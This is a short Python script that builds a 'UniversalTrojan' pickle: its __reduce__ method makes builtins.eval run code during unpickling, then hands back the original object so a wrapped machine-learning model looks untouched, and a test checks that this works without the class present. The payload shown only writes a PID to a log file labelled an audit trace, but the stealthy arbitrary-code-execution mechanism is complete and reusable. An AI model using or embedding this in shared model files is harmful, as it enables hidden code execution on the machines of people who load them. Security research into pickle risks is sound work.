import pickle
import os
import builtins

class UniversalTrojan:
    def __init__(self, target_obj, log_file):
        self.target_obj = target_obj
        self.log_file = str(log_file)

    def __reduce__(self):
        target_bytes = pickle.dumps(self.target_obj)
        # In-process execution:
        # 1. Evaluates open(...).write(...) in current process context -> exact worker PID
        # 2. Re-deserializes clean target object -> model works 100%
        # 3. Tuple index [1] returns the clean target object
        # Uses builtins.eval so no custom class/module is needed at deserialization time!
        expr = f'(open({repr(self.log_file)}, "w").write(f"[SECURITY AUDIT TRACE] Timestamp: {{__import__(\'time\').time()}} | IN-PROCESS WORKER PID: {{__import__(\'os\').getpid()}}\\n"), __import__("pickle").loads({repr(target_bytes)}))[1]'
        return (builtins.eval, (expr,))

def test():
    log_path = "test_audit.log"
    if os.path.exists(log_path):
        os.remove(log_path)
    
    clean_model = {"model_name": "RandomForest", "accuracy": 0.98}
    trojan = UniversalTrojan(clean_model, log_path)
    payload_bytes = pickle.dumps(trojan)
    
    # Simulate a separate process unpickling without UniversalTrojan defined
    # We delete UniversalTrojan from globals to test portability
    del trojan
    
    current_pid = os.getpid()
    result = pickle.loads(payload_bytes)
    
    print("Unpickled object successfully:", result)
    assert result == clean_model, "Model integrity failed!"
    
    with open(log_path, "r") as f:
        log_content = f.read().strip()
    print("Audit log content:", log_content)
    
    assert f"IN-PROCESS WORKER PID: {current_pid}" in log_content, f"PID mismatch: expected {current_pid}"
    print(f"VERIFICATION SUCCESSFUL: Recorded PID matches exact worker PID ({current_pid}) and model is intact!")
    
    if os.path.exists(log_path):
        os.remove(log_path)

if __name__ == "__main__":
    test()
